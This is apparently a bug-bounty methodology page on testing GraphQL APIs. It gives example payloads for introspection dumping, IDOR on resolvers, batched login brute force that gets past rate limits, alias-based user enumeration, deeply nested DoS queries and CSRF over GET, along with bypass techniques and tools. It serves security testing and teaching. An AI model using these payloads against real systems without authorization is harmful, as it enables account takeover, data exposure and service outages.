# GraphQL

GraphQL is a query language for APIs where the client dictates the exact shape of the data it wants, served through a single endpoint (commonly `/graphql`). Because the schema is self-documenting and the server executes arbitrary client-written queries, misconfigurations such as enabled introspection in production, missing per-resolver authorization, query batching, and unlimited complexity turn into information disclosure, IDOR, rate-limit bypass, CSRF, and application-level DoS. Severity depends on what the resolvers expose — from schema leakage (low) up to PII exposure of any user or infrastructure abuse (high/critical).

## Hunting Checklist

1. Find the endpoint: try common paths (`/graphql`, `/graphiql`, `/playground`, `/api/graphql`, `/v1/graphql`, `/query`) and grep HTML/JS bundles for `graphql`, `__schema`, `queryName`, operation names, or `.graphql` strings.
2. Fingerprint the server/engine behind the endpoint (graphw00f) — different engines have different default protections.
3. Check if introspection is enabled; if it is, dump the full schema with InQL or a raw `__schema` query.
4. If introspection is locked down, still reconstruct the schema: mine JS bundles for the exact queries/mutations the frontend ships, use field suggestion errors, or run AutoGraphQL/Graphiql-based discovery.
5. Visualize the schema (GraphQL Voyager) and identify juicy types: `User`, `Payment`, `Order`, `Secret`, admin-only mutations.
6. Enumerate roles: create two accounts and compare what each query/mutation returns — test authorization at the resolver level, not the endpoint level (classic BOLA/IDOR via `id`/`node` arguments).
7. Test whether the endpoint accepts GET requests with query parameters (GraphQL-over-GET CSRF).
8. Test rate limiting both for single queries and for batched/aliased queries.
9. Probe complexity limits: deeply nested queries, fragments, circular aliases, `@skip`/`@include` tricks.
10. Look for leftover dev tools exposed in production: GraphiQL, GraphQL Playground, Altair, Voyager UIs.

## Test Cases & Examples

### Introspection

Minimal probe — does the server answer?

```graphql
{ __schema { types { name } } }
```

Dump field names and types for one object:

```graphql
{
  __type(name: "User") {
    name
    fields { name type { name } }
  }
}
```

Full introspection query via curl (then feed the JSON to Voyager):

```bash
curl -sk 'https://target.com/graphql' \
  -H 'Content-Type: application/json' \
  --data '{"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{ name args{ name type{ name ofType{ name } } } } } } }"}' | jq
```

### Basic query / mutation execution

```graphql
query getUser($id: ID!) {
  user(id: $id) {
    id
    email
    phone
    creditCard { number }
  }
}
```

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query":"query { viewer { id email } }","variables":{}}
```

### IDOR / BOLA on resolvers

Swap the object id (or use `node(id: ...)` global identifiers) with another account's value:

```graphql
query { order(id: <victim_order_id>) { items { product price } address { street } } }
```

### Field suggestion when introspection is disabled

```graphql
{ usersss { id } }
```

Servers often reply `Cannot query field 'usersss' on type 'Query'. Did you mean 'users'?` — use these errors to enumerate real field names (graphw00f automates this).

### GraphQL over GET (CSRF)

```http
GET /graphql?query={__schema{types{name}}}&operationName=&variables={} HTTP/1.1
Host: target.com
```

If state-changing mutations are allowed over GET without anti-CSRF tokens, an attacker page can fire them cross-origin with the victim's cookies.

### Query batching — rate-limit / brute-force bypass

Batched requests are frequently counted as one request against the limit:

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

[
  {"query":"mutation { login(email:\"a1@x.com\", password:\"test1\") { token } }"},
  {"query":"mutation { login(email:\"a2@x.com\", password:\"test2\") { token } }"},
  {"query":"mutation { login(email:\"a3@x.com\", password:\"test3\") { token } }"}
]
```

### Aliases — many operations in one query

```graphql
{
  a1: userExists(email: "user1@target.com") { exists }
  a2: userExists(email: "user2@target.com") { exists }
  a3: userExists(email: "user3@target.com") { exists }
}
```

Aliases let you run hundreds of sub-operations in a single HTTP request — useful for user enumeration, password brute force, or scraping around pagination limits.

### Complexity / depth DoS probes

```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```

Also try duplicate/spread fragment aliases and circular alias definitions (where supported) to exhaust server CPU/memory — classic application-level DoS.

## Bypass Techniques

- **Introspection disabled** → reconstruct schema from JS bundles (InQL can import them), abuse field-suggestion error messages, and replay operation names seen in normal traffic.
- **Rate limits per HTTP request** → batch array-of-queries or alias sub-operations within one request.
- **Depth/complexity limits** → vary between deeply nested queries, `@skip(if: true)` on expensive branches, batching, and aliasing to find the accounting gaps.
- **Whitelisted queries only** → reformat/reorder the query (minify, remove aliases the whitelist matched on, change whitespace) since naive whitelist matching breaks.
- **GET blocked but CSRF desired** → try `POST` with `Content-Type: text/plain` or `application/x-www-form-urlencoded` bodies that permissive servers still parse as JSON.
- **Hidden mutation arguments** → same as REST: try alternate ids (`node`, global `ID`), `.json`-style variants of the endpoint path, and old API routes that proxy the same resolvers without auth checks.

## Tools & Resources

**Videos:**
- GraphQL Video - [InsiderPhd](https://www.youtube.com/watch?v=GlvNwhq-uBg)
- [REST in Peace: Abusing GraphQL to Attack Underlying Infrastructure - LevelUp 0x05](https://www.youtube.com/watch?v=NPDp7GHmMa0)

**Blogs / methodology:**
- Exploit GraphQL - [YesWeHack Blog](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)
- Hacking GraphQL - [Part 1](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-1-understanding-graphql-basics-72bb3dd22efa) / [Part 2](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24)
- [That single GraphQL issue that you keep missing (GraphQL CSRF)](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) by [Doyensec](https://www.doyensec.com/)
- [Reverse engineer a GraphQL API](https://swizec.com/blog/reverse-engineer-a-graphql-api-to-automate-love-notes-codewithswiz-24)
- [Exploiting GraphQL](https://blog.assetnote.io/2021/08/29/exploiting-graphql/) by [Assetnote](https://assetnote.io/)
- [GraphQL Resources Thread](https://twitter.com/holybugx/status/1441460070387261440?s=21) by [HolyBugx](https://twitter.com/HolyBugx)
- [GraphQL Test Cases](https://anmolksachan.github.io/graphql/)

**Tools:**
- [GraphQL Voyager](https://apis.guru/graphql-voyager/) — visualize the schema.
- [GraphQL Cheatsheet](https://devhints.io/graphql)
- [AutoGraphQL](https://graphql-dashboard.herokuapp.com/) — automated GraphQL security dashboard; demo [video](https://www.youtube.com/watch?v=JJmufWfVvyU)
- [graphw00f](https://github.com/dolevf/graphw00f) — GraphQL server engine fingerprinting utility to learn what technology is behind a given endpoint.
- [InQL - Introspection GraphQL Scanner](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f) — Burp extension that generates queries, introspects, and flags common issues.
- [Graphicator](https://github.com/cybervelia/graphicator) — GraphQL "scraper" / extractor that dumps objects via id enumeration.

**Labs:**
- [Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)

## Report Tips

- Prioritize what the schema *exposes*: an introspection dump alone is often informational, but pair it with a concrete resolver that returns other users' PII or accepts privileged mutations.
- For batching/alias rate-limit bypass, state how many operations you executed per request and what they achieved (successful logins, scraped records) so triage sees it as a brute-force enabler, not a curiosity.
- For depth/complexity DoS, demonstrate measurable latency or resource exhaustion impact rather than just an oversized query, and note if it crashes the shared API gateway (availability impact).
- GraphQL CSRF over GET: show a working PoC that performs a state-changing mutation with a victim's session.
